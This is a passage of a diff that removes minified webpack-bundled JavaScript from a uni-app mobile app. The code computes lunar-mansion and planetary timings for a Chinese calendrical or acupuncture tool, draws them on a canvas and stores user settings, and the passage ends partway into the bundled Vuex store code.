-                  var e = 1;
-                  break;
-                case 1:
-                  e = 1;
-                  break;
-                case 2:
-                  e = 1;
-                  break;
-              }
-              this.ZY = (0, _xl.JS)(this.time, this.lntime, e, this.jingwei.jw);
-              var t = this.lntime,
-                n = t.replace(/-/g, "/");
-              n = Date.parse(n);
-              var r = new Date(n),
-                i = r.getFullYear(),
-                o = this.time,
-                a = o.replace(/-/g, "/");
-              a = Date.parse(a);
-              for (var s = new Date(a), u = s.getFullYear(), c = 0.013962777777777777 * (i - u), l = 0; l < 11; l++) this.ZY.xingdu[l] = parseFloat(this.ZY.xingdu[l]) + c, this.ZY.xingdu[l] > 360 && (this.ZY.xingdu[l] -= 360);
-              switch (this.radio) {
-                case 0:
-                  var f = this.ZY.xingxiu;
-                  break;
-                case 1:
-                  var d = [349.4, 358.3, 15.9, 26.3, 41.1, 53.2, 69, 70, 81.8, 112.3, 115.2, 130.5, 136.4, 151.4, 170.1, 187.2, 200, 208.9, 225.2, 230.6, 237, 255.6, 266.3, 290.1, 298, 308.9, 318.3, 333.6],
-                    h = 13.765 + 0.013962777777777777 * (i - 2000.2222);
-                  for (f = [], l = 0; l < 28; l++) {
-                    var p = d[l] + h;
-                    p >= 360 && (p -= 360), f[l] = p.toFixed(4);
-                  }
-                  break;
-                case 2:
-                  f = this.ZY.xingxiu;
-                  break;
-              }
-              var g = uni.createCanvasContext("myCanvas", this),
-                v = this.systeminfo.windowWidth,
-                m = v / 440;
-              g.scale(m, m), g.translate(0, 25), g.fillStyle = "#ffffff", g.fillRect(0, 0, 220, 720), g.save(), g.fillStyle = "#d60014", g.fillRect(0, 0, 80, 720), g.fillStyle = "#008f42", g.fillRect(82, 0, 68, 720), g.fillStyle = "#1c227c", g.fillRect(152, 0, 68, 720), g.restore();
-              var _ = this.tihuanwenzi,
-                y = this.tihuanwenzi2,
-                w = this.tihuanwenzi3,
-                b = [],
-                x = [],
-                k = [];
-              for (d = 0; d < 28; d++) this.tihuanwenzip[d].length > 1 ? b[d] = _[d] + "." + this.tihuanwenzip[d] : b[d] = _[d], this.tihuanwenzip2[d].length > 1 ? x[d] = y[d] + "." + this.tihuanwenzip2[d] : x[d] = y[d], this.tihuanwenzip3[d].length > 1 ? k[d] = w[d] + "." + this.tihuanwenzip3[d] : k[d] = w[d];
-              var S = this.jinfeng(),
-                O = this.getmd(this.ZY.lnxingdu, this.ZY.lnbazi),
-                T = Number(this.ZY.lnbazi[8].substr(0, 2));
-              if (T % 2 == 0) var P = (60 + Number(this.ZY.lnbazi[8].substr(3, 2))) / 120;else P = Number(this.ZY.lnbazi[8].substr(3, 2)) / 120;
-              var A = this.ZY.lnxingdu[1],
-                I = parseFloat(A);
-              while (I >= 360) I -= 360;
-              this.now = new Date(), g.save(), g.font = "12px Arial";
-              for (l = 0; l < 28; l++) {
-                var C = f[l];
-                if (I - C < 0) {
-                  var E = Math.abs((I - C) / this.ZY.yueliang * 12 * 3600);
-                  this.t1 = E;
-                  break;
-                }
-                if (27 == l & I - C > 0) {
-                  E = Math.abs((I - f[0] - 360) / this.ZY.yueliang * 12 * 3600);
-                  this.t1 = E, l = 0;
-                  break;
-                }
-              }
-              for (var L = 5, M = 0; M < b[l].length; M++) L += 12, "." == b[l][M] && (L -= 6), E / 3600 > 2 && this.radio2 < 3 && g.fillText(b[l][M], 135, L);
-              if (3 == this.radio2 || 4 == this.radio2 ? (this.st1 = S.tt[0], this.xming = S.tx[0], this.xmings = this.tihuanwenzip[this.tihuanwenzi.indexOf(this.xming)]) : (this.st1 = this.gettime(E), this.xming = _[l], this.xmings = this.tihuanwenzip[l]), this.radio2 < 3) for (var D = 0; D < 28; D++) {
-                var j = parseFloat(f[D]);
-                if (j - I > 0 & j - I < this.ZY.yueliang) {
-                  var N = (j - I) / this.ZY.yueliang;
-                  g.lineWidth = 4, g.strokeStyle = "#fdeb01", g.beginPath(), g.moveTo(82, 720 * N), g.lineTo(150, 720 * N), g.stroke();
-                  d = D + 1;
-                  28 == d && (d = 0);
-                  for (L = 720 * N + 5, M = 0; M < b[d].length; M++) L += 12, "." == b[d][M] && (L -= 6), g.fillText(b[d][M], 135, L);
-                } else if (27 == D & j - I < 0) {
-                  N = (parseFloat(f[0]) + 360 - I) / this.ZY.yueliang;
-                  g.lineWidth = 4, g.strokeStyle = "#fdeb01", g.beginPath(), g.moveTo(82, 720 * N), g.lineTo(150, 720 * N), g.stroke(), g.font = "12px Arial";
-                  for (L = 720 * N + 5, M = 0; M < b[1].length; M++) L += 12, "." == b[1][M] && (L -= 6), g.fillText(b[1][M], 135, L);
-                }
-              }
-              if (0 == this.radio2) var R = 30,
-                $ = 0;else if (1 == this.radio2) R = 30, $ = 60;else if (2 == this.radio2) R = 120, $ = 240;else R = 0, $ = 0;
-              var F = parseFloat(A) + R;
-              while (F >= 360) F -= 360;
-              if (3 == this.radio2 || 4 == this.radio2) this.st2 = S.tt[3], this.xming2 = S.tx[3], this.xmings2 = this.tihuanwenzip2[this.tihuanwenzi2.indexOf(this.xming2)];else if (5 == this.radio2) {
-                for (h = 0; h < 28; h++) {
-                  var U = f[h];
-                  if (O.beidou - U < 0) {
-                    var B = Math.abs((O.beidou - f[h - 1]) / this.ZY.yang * 12 * 3600);
-                    this.t2 = B;
-                    break;
-                  }
-                  if (O.beidou - U < 0 & 0 == h) {
-                    B = Math.abs((O.beidou + 360 - f[27]) / this.ZY.yang * 12 * 3600);
-                    this.t2 = B, h = 0;
-                    break;
-                  }
-                  if (O.beidou - U > 0 & 27 == h) {
-                    B = Math.abs((O.beidou - f[27]) / this.ZY.yang * 12 * 3600);
-                    this.t2 = B, h = 27;
-                    break;
-                  }
-                }
-                this.st2 = this.gettime(B), this.xming2 = y[h], this.xmings2 = this.tihuanwenzip2[this.tihuanwenzi2.indexOf(this.xming2)];
-              } else {
-                for (h = 0; h < 28; h++) {
-                  var q = f[h];
-                  if (F - q < 0) {
-                    B = Math.abs((F - q) / this.ZY.yueliang * 12 * 3600);
-                    this.t2 = B;
-                    break;
-                  }
-                  if (F - q > 0 & 27 == h) {
-                    B = Math.abs((F - f[0] - 360) / this.ZY.yueliang * 12 * 3600);
-                    this.t2 = B, h = 0;
-                    break;
-                  }
-                }
-                L = 5;
-                for (var z = 0; z < x[h].length; z++) L += 12, "." == x[h][z] && (L -= 6), B / 3600 > 2 & 3 != this.radio2 & 4 != this.radio2 && g.fillText(x[h][z], 5, L);
-                this.st2 = this.gettime(B), this.xming2 = y[h], this.xmings2 = this.tihuanwenzip2[h];
-              }
-              if (this.radio2 < 3) for (D = 0; D < 28; D++) {
-                var H = parseFloat(f[D]);
-                if (H - F > 0 & H - F < this.ZY.yueliang) {
-                  N = (H - F) / this.ZY.yueliang;
-                  g.lineWidth = 4, g.strokeStyle = "#fdeb01", g.beginPath(), g.moveTo(0, 720 * N), g.lineTo(80, 720 * N), g.stroke(), g.font = "12px Arial";
-                  d = D + 1;
-                  28 == d && (d = 0);
-                  for (L = 720 * N + 5, M = 0; M < x[d].length; M++) L += 12, "." == x[d][M] && (L -= 6), g.fillText(x[d][M], 5, L);
-                } else if (27 == D & H - F < 0) {
-                  N = (parseFloat(f[0]) + 360 - F) / this.ZY.yueliang;
-                  g.lineWidth = 4, g.strokeStyle = "#fdeb01", g.beginPath(), g.moveTo(0, 720 * N), g.lineTo(80, 720 * N), g.stroke(), g.font = "12px Arial";
-                  for (L = 720 * N + 5, M = 0; M < x[1].length; M++) L += 12, "." == x[1][M] && (L -= 6), g.fillText(x[1][M], 5, L);
-                }
-              }
-              var Y = parseFloat(A) + $;
-              while (Y >= 360) Y -= 360;
-              if (this.radio2 <= 4) {
-                for (M = 0; M < 28; M++) {
-                  var J = f[M];
-                  if (Y - J < 0) {
-                    var V = Math.abs((Y - J) / this.ZY.yueliang * 12 * 3600);
-                    this.t3 = V;
-                    break;
-                  }
-                  if (Y - J > 0 & 27 == M) {
-                    V = Math.abs((Y - f[0] - 360) / this.ZY.yueliang * 12 * 3600);
-                    this.t3 = V, M = 0;
-                    break;
-                  }
-                }
-                for (L = 5, z = 0; z < k[M].length; z++) L += 12, "." == k[M][z] && (L -= 6), V / 3600 > 2 & 0 != this.radio2 & 3 != this.radio2 & 4 != this.radio2 && g.fillText(k[M][z], 203, L);
-                3 == this.radio2 || 4 == this.radio2 ? (this.st3 = S.tt[2], this.xming3 = S.tx[2], this.xmings3 = this.tihuanwenzip3[this.tihuanwenzi3.indexOf(this.xming3)]) : (this.st3 = this.gettime(V), this.xming3 = w[M], this.xmings3 = this.tihuanwenzip3[M]);
-              } else if (5 == this.radio2) {
-                var Z = O.beidou;
-                for (M = 0; M < 28; M++) {
-                  var W = f[M];
-                  if (Z - W < 0 & 0 !== M) {
-                    V = Math.abs((Z - f[M - 1]) / this.ZY.yang * 12 * 3600);
-                    this.t3 = V;
-                    break;
-                  }
-                  if (Z - W > 0 & 27 == M) {
-                    V = Math.abs((Z - f[27]) / this.ZY.yang * 12 * 3600);
-                    this.t3 = V, M = 27;
-                    break;
-                  }
-                  if (Z - W < 0 & 0 == M) {
-                    V = Math.abs((Z + 360 - f[27]) / this.ZY.yang * 12 * 3600);
-                    this.t3 = V, M = 0;
-                    break;
-                  }
-                }
-                for (L = 5, z = 0; z < k[M].length; z++) L += 12, "." == k[M][z] && (L -= 6), V > 518400 && g.fillText(k[M][z], 203, L);
-                this.st3 = this.gettime(V), this.xming3 = w[M], this.xmings3 = this.tihuanwenzip3[M];
-              }
-              if (3 == this.radio2 || 4 == this.radio2) {
-                var K = (30 - this.ZY.lnxingdu[0] % 30) / this.ZY.yang * 12 * 3600;
-                this.st5 = this.gettime(K), this.xming5 = this.zhi[S.tg[0]];
-              } else if (5 == this.radio2) {
-                K = O.beidou % 30 / this.ZY.yang * 12 * 3600;
-                this.st5 = this.gettime(K), this.xming5 = this.zhi2[O.dougong];
-              }
-              if (this.radio2 < 3 && 0 != this.radio2) for (D = 0; D < 28; D++) {
-                var G = parseFloat(f[D]);
-                if (G - Y > 0 & G - Y < this.ZY.yueliang) {
-                  N = (G - Y) / this.ZY.yueliang;
-                  g.lineWidth = 4, g.strokeStyle = "#fdeb01", g.beginPath(), g.moveTo(152, 720 * N), g.lineTo(220, 720 * N), g.stroke(), g.font = "12px Arial";
-                  d = D + 1;
-                  28 == d && (d = 0);
-                  for (L = 720 * N + 5, M = 0; M < k[d].length; M++) L += 12, "." == k[d][M] && (L -= 6), g.fillText(k[d][M], 203, L);
-                } else if (27 == D & G - Y < 0) {
-                  N = (parseFloat(f[0]) + 360 - Y) / this.ZY.yueliang;
-                  g.lineWidth = 4, g.strokeStyle = "#fdeb01", g.beginPath(), g.moveTo(152, 720 * N), g.lineTo(220, 720 * N), g.stroke(), g.font = "12px Arial";
-                  for (L = 720 * N + 5, M = 0; M < k[1].length; M++) L += 12, "." == k[1][M] && (L -= 6), g.fillText(k[1][M], 203, L);
-                }
-              } else if (5 == this.radio2) {
-                var Q = O.beidou;
-                for (D = 0; D < 28; D++) {
-                  var X = parseFloat(this.ZY.xingxiu[27 - D]);
-                  if (X - Q < 0 & X - Q > -30) {
-                    N = (Q - X) / 30;
-                    g.lineWidth = 4, g.strokeStyle = "#fdeb01", g.beginPath(), g.moveTo(152, 720 * N), g.lineTo(220, 720 * N), g.stroke(), g.font = "12px Arial";
-                    d = -D - 1;
-                    while (d < 0) d += 28;
-                    for (L = 720 * N + 5, M = 0; M < k[d].length; M++) L += 12, "." == k[d][M] && (L -= 6), g.fillText(k[d][M], 203, L);
-                  } else if (X - Q - 360 > -30) {
-                    N = (Q + 360 - X) / 30;
-                    g.lineWidth = 4, g.strokeStyle = "#fdeb01", g.beginPath(), g.moveTo(152, 720 * N), g.lineTo(220, 720 * N), g.stroke(), g.font = "12px Arial";
-                    d = -D - 1;
-                    while (d < 0) d += 28;
-                    for (L = 720 * N + 5, M = 0; M < k[d].length; M++) L += 12, "." == k[d][M] && (L -= 6), g.fillText(k[d][M], 203, L);
-                  }
-                }
-              }
-              g.restore();
-              var ee = [];
-              for (l = 0; l < 11; l++) {
-                for (d = this.ZY.lnxingdu[l], D = 0; D < 12; D++) if (d -= 30, d <= 0) break;
-                d += 30, ee[l] = d;
-              }
-              var te = [];
-              for (l = 0; l < 11; l++) {
-                i = ee[l] - ee[1], u = ee[l] + 30 - ee[1];
-                1 != l & i > 0 & i < this.ZY.yueliang && te.push(i), 1 != l & u > 0 & u < this.ZY.yueliang && te.push(u);
-              }
-              this.lding = te;
-              var ne = new Array(146);
-              for (l = 0; l < ne.length; l++) ne[l] = 0;
-              for (l = 0; l < te.length; l++) for (d = Math.round(te[l] / this.ZY.yueliang * 144) - 1, i = [0.1, 2, 6, 9.5, 12.5, 9.5, 6, 2, 0.1], N = 0; N < 9; N++) d - 4 + N < 146 && (ne[d - 4 + N] += i[N]);
-              if (this.radio2 < 3) {
-                g.save(), g.fillStyle = "#ffec00", g.beginPath(), g.moveTo(80, 0);
-                for (l = 0; l < ne.length; l++) {
-                  var re = (ne[l] + ne[l + 1]) / 2,
-                    ie = l;
-                  re && g.quadraticCurveTo(80 - 2.5 * ne[l], 5 * l, 80 - 2.5 * re, 5 * ie + 2.5);
-                }
-                0 !== ne[ne.length] && g.lineTo(80, 720), g.fill(), g.restore();
-              }
-              var oe = [];
-              for (l = 0; l < 11; l++) {
-                for (d = this.ZY.xingdu[l], D = 0; D < 12; D++) if (d -= 30, d <= 0) break;
-                d += 30, oe[l] = d;
-              }
-              var ae = [];
-              for (l = 0; l < 11; l++) {
-                i = oe[l] - ee[1], u = oe[l] + 30 - ee[1];
-                i > 0 & i < this.ZY.yueliang && ae.push(i), u > 0 & u < this.ZY.yueliang && ae.push(u);
-              }
-              this.ding = ae;
-              for (E = new Array(146), l = 0; l < E.length; l++) E[l] = 0;
-              var se = 360 - this.ZY.suicha;
-              for (l = 0; l < ae.length; l++) {
-                var ue = ae[l] - se;
-                for (d = Math.round(ue / this.ZY.yueliang * 144) - 1, i = [0.1, 2, 6, 9.5, 12.5, 9.5, 6, 2, 0.1], N = 0; N < 9; N++) d - 4 + N < 146 && (E[d - 4 + N] += i[N]);
-              }
-              if (this.radio2 < 3 && this.timef) {
-                g.save(), g.strokeStyle = "#ffffff", g.lineWidth = 2, g.beginPath(), g.moveTo(81, 0);
-                for (l = 0; l < E.length; l++) {
-                  re = (E[l] + E[l + 1]) / 2, ie = l;
-                  re && g.quadraticCurveTo(81 - 2.5 * E[l], 5 * l, 81 - 2.5 * re, 5 * ie + 2.5);
-                }
-                g.stroke(), g.restore();
-              }
-              if (this.radio2 < 5) {
-                g.save();
-                for (l = 0; l < 6; l++) g.beginPath(), g.arc(81, 120 * l + 120 * (1 - P), 5, 0, 2 * Math.PI), g.fillStyle = "#FFFFFF", g.arc(151, 120 * l + 120 * (1 - P), 5, 0, 2 * Math.PI), g.fillStyle = "#FFFFFF", g.fill();
-                g.restore();
-              } else {
-                for (l = 0; l < 2; l++) g.save(), g.beginPath(), g.arc(151, 360 * l + 360 * (1 - P), 5, 0, 2 * Math.PI), g.fillStyle = "#FFFFFF", g.fill(), g.restore();
-                for (l = 0; l < 6; l++) g.save(), g.beginPath(), g.arc(81, 720 - 120 * l - 120 * P, 5, 0, 2 * Math.PI), g.fillStyle = "#FFFFFF", g.fill(), g.restore();
-              }
-              setTimeout(function () {
-                g.draw();
-              }, 50);
-            },
-            getmd: function (e, t) {
-              for (var n = ["\u5B50", "\u4E11", "\u5BC5", "\u536F", "\u8FB0", "\u5DF3", "\u5348", "\u672A", "\u7533", "\u9149", "\u620C", "\u4EA5"], r = this.ZY.xingxiu, i = n.indexOf(t[7]), o = [], a = 1 * e[0], s = 0; s < 12; s++) if (a -= 30, a < 0) break;
-              a += 30;
-              var u = i - 3;
-              u < 0 && (u += 12);
-              var c = s + u;
-              c >= 12 ? c -= 12 : c < 0 && (c += 12);
-              for (var l = a, f = 30 * (1 - a / 30), d = l, h = 0; h < u; h++) (s + h < 12 || s + h > 11) && (d += 30);
-              0 == u ? d = 0 : d += f - 30;
-              var p = 1 * e[0] + d;
-              if (p > 360) for (var g = 0; p > 360; g++) p -= 360;
-              for (var v = p, m = [this.zhi[10], this.zhi[9], this.zhi[8], this.zhi[7], this.zhi[6], this.zhi[5], this.zhi[4], this.zhi[3], this.zhi[2], this.zhi[1], this.zhi[0], this.zhi[11]], _ = 0; _ < r.length; _++) {
-                o = p - r[_];
-                if (o < 0) {
-                  r[_];
-                  break;
-                }
-                if (27 == _) parseFloat(r[0]);
-              }
-              28 == _ && (_ -= 28), p += 30, p >= 360 && (p -= 360);
-              for (var y = 0; y < r.length; y++) {
-                o = p - r[y];
-                if (o < 0) break;
-              }
-              28 == y && (y -= 28), p += 30, p >= 360 && (p -= 360);
-              for (var w = 0; w < r.length; w++) {
-                o = p - r[w];
-                if (o < 0) break;
-              }
-              28 == w && (w -= 28);
-              for (var b = [], x = 0; x < 3; x++) {
-                o = c + x;
-                o >= 12 && (o -= 12), b.push(m[o]);
-              }
-              if (0 == this.radio2) var k = 30,
-                S = 0;else if (1 == this.radio2) k = 30, S = 60;else if (2 == this.radio2) k = 120, S = 240;else k = 0, S = 0;
-              var O = v + k;
-              while (O >= 360) O -= 360;
-              for (u = 0; u < r.length; u++) {
-                o = O - r[u];
-                if (o < 0) break;
-              }
-              28 == u && (u -= 28), O += 30;
-              while (O >= 360) O -= 360;
-              for (var T = 0; T < r.length; T++) {
-                o = O - r[T];
-                if (o < 0) break;
-              }
-              28 == T && (T -= 28), O += 30, O >= 360 && (O -= 360);
-              for (var P = 0; P < r.length; P++) {
-                o = O - r[P];
-                if (o < 0) break;
-              }
-              28 == P && (P -= 28);
-              var A = v + S;
-              while (A >= 360) A -= 360;
-              for (var I = 0; I < r.length; I++) {
-                o = A - r[I];
-                if (o < 0) {
-                  p = r[I] - A;
-                  break;
-                }
-                if (27 == I) p = parseFloat(r[0]) + 360 - A;
-              }
-              28 == I && (I -= 28), A += 30;
-              while (A >= 360) A -= 360;
-              for (var C = 0; C < r.length; C++) {
-                o = A - r[C];
-                if (o < 0) break;
-              }
-              28 == C && (C -= 28), A += 30;
-              while (A >= 360) A -= 360;
-              for (var E = 0; E < r.length; E++) {
-                o = A - r[E];
-                if (o < 0) break;
-              }
-              28 == E && (E -= 28);
-              var L = i + 4 - n.indexOf(["\u4E11", "\u5B50", "\u4EA5", "\u620C", "\u9149", "\u7533", "\u672A", "\u5348", "\u5DF3", "\u8FB0", "\u536F", "\u5BC5"][n.indexOf(t[3])]);
-              while (L < 0) L += 12;
-              var M = [];
-              if (4 == this.radio2) var D = this.zhi;else D = this.zhi2;
-              for (x = 0; x < 3; x++) {
-                o = L + x;
-                while (o >= 12) o -= 12;
-                M.push(D[o]);
-              }
-              var j = 240 - 1 * e[0];
-              while (j < 0) j += 360;
-              for (g = 0; g < r.length; g++) {
-                var N = j - r[g];
-                if (N < 0) break;
-              }
-              var R = parseInt(j / 30),
-                $ = 10 - R;
-              while ($ < 0) $ += 12;
-              var F = 360 * (Number(t[8].substr(0, 2)) + Number(t[8].substr(3, 2)) / 60 - 20) / 24,
-                U = j - F;
-              while (U < 0) U += 360;
-              while (U > 360) U -= 360;
-              var B = {};
-              return B.ridou = g, B.dougong = $, B.mds = v, B.mdx = [_, y, w], B.mgs = b, B.tg = M, B.doubing = U, B.beidou = j, this.dou = B, B;
-            },
-            jinfeng: function () {
-              switch (this.radio) {
-                case 0:
-                  var e = this.ZY.xingxiu;
-                  break;
-                case 1:
-                  var t = [349.4, 358.3, 15.9, 26.3, 41.1, 53.2, 69, 70, 81.8, 112.3, 115.2, 130.5, 136.4, 151.4, 170.1, 187.2, 200, 208.9, 225.2, 230.6, 237, 255.6, 266.3, 290.1, 298, 308.9, 318.3, 333.6],
-                    n = this.lntime,
-                    r = n.replace(/-/g, "/");
-                  r = Date.parse(r);
-                  for (var i = new Date(r), o = i.getFullYear(), a = 13.765 + 0.013962777777777777 * (o - 2000.2222), s = (e = [], 0); s < 28; s++) {
-                    var u = t[s] + a;
-                    u >= 360 && (u -= 360), e[s] = u.toFixed(4);
-                  }
-                  break;
-                case 2:
-                  e = this.ZY.xingxiu;
-                  break;
-              }
-              t = {};
-              var c = [],
-                l = [],
-                f = [];
-              for (s = 0; s < 11; s++) {
-                var d = parseFloat(this.ZY.lnxingdu[s]) + 0;
-                while (d >= 360) d -= 360;
-                while (d < 0) d += 360;
-                if (7 == s || 8 == s) for (var h = 0; h < 28; h++) {
-                  var p = e[h];
-                  if (d - p < 0 & 0 != h) {
-                    var g = Math.abs((d - e[h - 1]) / this.ZY.xings[s] * 12 * 3600),
-                      v = this.gettime(g);
-                    break;
-                  }
-                  if (d - p > 0 & 27 == h) {
-                    g = Math.abs((d - e[27]) / this.ZY.xings[s] * 12 * 3600), v = this.gettime(g);
-                    break;
-                  }
-                  if (d - p < 0 & 0 == h) {
-                    g = Math.abs((d + 360 - e[27]) / this.ZY.xings[s] * 12 * 3600), v = this.gettime(g);
-                    break;
-                  }
-                } else for (h = 0; h < 28; h++) {
-                  var m = e[h];
-                  if (d - m < 0) {
-                    g = Math.abs((d - m) / this.ZY.xings[s] * 12 * 3600), v = this.gettime(g);
-                    break;
-                  }
-                  if (27 == h & d - m > 0) {
-                    g = Math.abs((d - e[0] - 360) / this.ZY.xings[s] * 12 * 3600), v = this.gettime(g);
-                    break;
-                  }
-                }
-                c[s] = v;
-                var _ = parseInt(parseFloat(this.ZY.lnxingdu[s]) / 30),
-                  y = 10 - _;
-                while (y < 0) y += 12;
-                f[s] = y, l[s] = s < 2 ? this.tihuanwenzi[h] : s > 1 && s < 7 ? this.wuxingtihuan[s - 2][h % 7] : this.siyutihuan[h];
-              }
-              return t.tt = c, t.tx = l, t.tg = f, this.wuyun = t, t;
-            },
-            getStorage: function () {
-              var e = uni.getStorageSync("storage_key");
-              return e && __f__("log", e, " at pages/index.vue:1891"), e;
-            },
-            getStorage2: function () {
-              var e = uni.getStorageSync("storage_key2");
-              return e;
-            },
-            getStorage3: function () {
-              var e = uni.getStorageSync("storage_key3");
-              return e;
-            },
-            getStoragebb: function () {
-              var e = uni.getStorageSync("banben");
-              return e;
-            },
-            fenxiang: function () {
-              var e = this.xming + "\n\u622A\u6B62\u65F6\u95F4\n" + this.st1 + "\n" + this.xming2 + "\n\u622A\u6B62\u65F6\u95F4\n" + this.st2 + "\n" + this.ming1 + "\n" + this.shuoming1 + "\n" + this.ming2 + "\n" + this.shuoming2 + "\n" + this.ming3 + "\n" + this.shuoming3;
-              uni.setClipboardData({
-                data: e,
-                success: function () {
-                  uni.showToast({
-                    title: "\u5DF2\u590D\u5236\u9488\u65B9\u4FE1\u606F"
-                  });
-                },
-                fail: function () {
-                  uni.showToast({
-                    title: "\u590D\u5236\u5931\u8D25"
-                  });
-                }
-              });
-            },
-            checkboxchange: function checkboxchange(res) {
-              uni.setStorage({
-                key: "storage_key",
-                data: res.detail.value,
-                success: function () {
-                  __f__("log", "\u4FDD\u5B58", res.detail.value, " at pages/index.vue:1945");
-                }
-              });
-              for (var i = 0; i < 15; i++) {
-                var codeString = "this.onplay" + i + "=false";
-                eval(codeString);
-              }
-              this.Set(), this.huabu();
-            },
-            checkboxchange2: function checkboxchange2(res) {
-              res.detail.value > 2 ? (this.moshi1[1].disable = !0, this.radio = 0) : this.moshi1[1].disable = !1, uni.setStorage({
-                key: "storage_key2",
-                data: res.detail.value,
-                success: function () {
-                  __f__("log", "\u4FDD\u5B582", res.detail.value, " at pages/index.vue:1967");
-                }
-              });
-              for (var i = 0; i < 15; i++) {
-                var codeString = "this.onplay" + i + "=false";
-                eval(codeString);
-              }
-              this.Set(), this.huabu();
-            },
-            showAddress: function () {
-              this.visible = !0;
-            },
-            change: function (e) {
-              this.jingwei.places = e.map(function (e) {
-                return e.name;
-              }), this.jingwei.jw = (0, _jw.jwcx)(this.jingwei.places[0], this.jingwei.places[1], this.jingwei.places[2]), uni.setStorage({
-                key: "storage_jw",
-                data: this.jingwei,
-                success: function () {
-                  __f__("log", "\u4FDD\u5B58", " at pages/index.vue:1989");
-                }
-              }), uni.navigateTo({
-                url: "/pages/kong/kong"
-              });
-            },
-            getBeijingtime: function (e) {
-              var t = new Date(e),
-                n = new Date(e),
-                r = n.getHours(),
-                i = -t.getTimezoneOffset() / 60;
-              return i < 0 ? (i = Math.abs(i) + 8, n.setHours(r + i)) : (i -= 8, n.setHours(r - i)), n;
-            },
-            gettime: function (e) {
-              var t = this.lntime,
-                n = t.replace(/-/g, "/");
-              n = Date.parse(n), n += 1000 * e;
-              var r = new Date(n),
-                i = r.getFullYear(),
-                o = r.getMonth() + 1 < 10 ? "0" + (r.getMonth() + 1) : r.getMonth() + 1,
-                a = r.getDate() < 10 ? "0" + r.getDate() : r.getDate(),
-                s = r.getHours() < 10 ? "0" + r.getHours() : r.getHours(),
-                u = r.getMinutes() < 10 ? "0" + r.getMinutes() : r.getMinutes(),
-                c = r.getSeconds() < 10 ? "0" + r.getSeconds() : r.getSeconds(),
-                l = i + "-" + o + "-" + a + " " + s + ":" + u + ":" + c;
-              return l;
-            },
-            dateFormat: function (e) {
-              var t = this.getBeijingtime(e),
-                n = t.getFullYear(),
-                r = t.getMonth() + 1 < 10 ? "0" + (t.getMonth() + 1) : t.getMonth() + 1,
-                i = t.getDate() < 10 ? "0" + t.getDate() : t.getDate(),
-                o = t.getHours() < 10 ? "0" + t.getHours() : t.getHours(),
-                a = t.getMinutes() < 10 ? "0" + t.getMinutes() : t.getMinutes(),
-                s = t.getSeconds() < 10 ? "0" + t.getSeconds() : t.getSeconds(),
-                u = n + "-" + r + "-" + i + " " + o + ":" + a + ":" + s;
-              return 0 == this.biao || (this.lntime = u), u;
-            }
-          }
-        };
-      exports.default = _default;
-    }).call(this, __webpack_require__("f3b9")["default"]);
-  },
-  "8f59": function (e, t, n) {
-    "use strict";
-
-    (function (t) {
-      var n = "undefined" !== typeof window ? window : "undefined" !== typeof t ? t : {},
-        r = n.__VUE_DEVTOOLS_GLOBAL_HOOK__;
-      function i(e, t) {
-        if (void 0 === t && (t = []), null === e || "object" !== typeof e) return e;
-        var n = function (e, t) {
-          return e.filter(t)[0];
-        }(t, function (t) {
-          return t.original === e;
-        });
-        if (n) return n.copy;
-        var r = Array.isArray(e) ? [] : {};
-        return t.push({
-          original: e,
-          copy: r
-        }), Object.keys(e).forEach(function (n) {
-          r[n] = i(e[n], t);
-        }), r;
-      }
-      function o(e, t) {
-        Object.keys(e).forEach(function (n) {
-          return t(e[n], n);
-        });
-      }
-      function a(e) {
-        return null !== e && "object" === typeof e;
-      }
-      var s = function (e, t) {
-          this.runtime = t, this._children = Object.create(null), this._rawModule = e;
-          var n = e.state;
-          this.state = ("function" === typeof n ? n() : n) || {};
-        },
-        u = {
-          namespaced: {
-            configurable: !0
-          }
-        };
-      u.namespaced.get = function () {
-        return !!this._rawModule.namespaced;
-      }, s.prototype.addChild = function (e, t) {
-        this._children[e] = t;
-      }, s.prototype.removeChild = function (e) {
-        delete this._children[e];
-      }, s.prototype.getChild = function (e) {
-        return this._children[e];
-      }, s.prototype.hasChild = function (e) {
-        return e in this._children;
-      }, s.prototype.update = function (e) {
-        this._rawModule.namespaced = e.namespaced, e.actions && (this._rawModule.actions = e.actions), e.mutations && (this._rawModule.mutations = e.mutations), e.getters && (this._rawModule.getters = e.getters);
-      }, s.prototype.forEachChild = function (e) {
-        o(this._children, e);
-      }, s.prototype.forEachGetter = function (e) {
-        this._rawModule.getters && o(this._rawModule.getters, e);
-      }, s.prototype.forEachAction = function (e) {
-        this._rawModule.actions && o(this._rawModule.actions, e);
-      }, s.prototype.forEachMutation = function (e) {
-        this._rawModule.mutations && o(this._rawModule.mutations, e);
-      }, Object.defineProperties(s.prototype, u);
-      var c = function (e) {
-        this.register([], e, !1);
-      };
-      c.prototype.get = function (e) {
-        return e.reduce(function (e, t) {
-          return e.getChild(t);
-        }, this.root);
-      }, c.prototype.getNamespace = function (e) {
-        var t = this.root;
-        return e.reduce(function (e, n) {
-          return t = t.getChild(n), e + (t.namespaced ? n + "/" : "");
-        }, "");
-      }, c.prototype.update = function (e) {
-        (function e(t, n, r) {
-          0;
-          if (n.update(r), r.modules) for (var i in r.modules) {
-            if (!n.getChild(i)) return void 0;
-            e(t.concat(i), n.getChild(i), r.modules[i]);
-          }
-        })([], this.root, e);
-      }, c.prototype.register = function (e, t, n) {
-        var r = this;
-        void 0 === n && (n = !0);
-        var i = new s(t, n);
-        if (0 === e.length) this.root = i;else {
-          var a = this.get(e.slice(0, -1));
-          a.addChild(e[e.length - 1], i);
-        }
-        t.modules && o(t.modules, function (t, i) {
-          r.register(e.concat(i), t, n);
-        });
-      }, c.prototype.unregister = function (e) {
-        var t = this.get(e.slice(0, -1)),
-          n = e[e.length - 1],
-          r = t.getChild(n);
-        r && r.runtime && t.removeChild(n);
-      }, c.prototype.isRegistered = function (e) {
-        var t = this.get(e.slice(0, -1)),
-          n = e[e.length - 1];
-        return !!t && t.hasChild(n);
-      };
-      var l;
-      var f = function (e) {
-          var t = this;
-          void 0 === e && (e = {}), !l && "undefined" !== typeof window && window.Vue && y(window.Vue);
-          var n = e.plugins;
-          void 0 === n && (n = []);
-          var i = e.strict;
-          void 0 === i && (i = !1), this._committing = !1, this._actions = Object.create(null), this._actionSubscribers = [], this._mutations = Object.create(null), this._wrappedGetters = Object.create(null), this._modules = new c(e), this._modulesNamespaceMap = Object.create(null), this._subscribers = [], this._watcherVM = new l(), this._makeLocalGettersCache = Object.create(null);
-          var o = this,
-            a = this.dispatch,
-            s = this.commit;
-          this.dispatch = function (e, t) {
-            return a.call(o, e, t);
-          }, this.commit = function (e, t, n) {
-            return s.call(o, e, t, n);
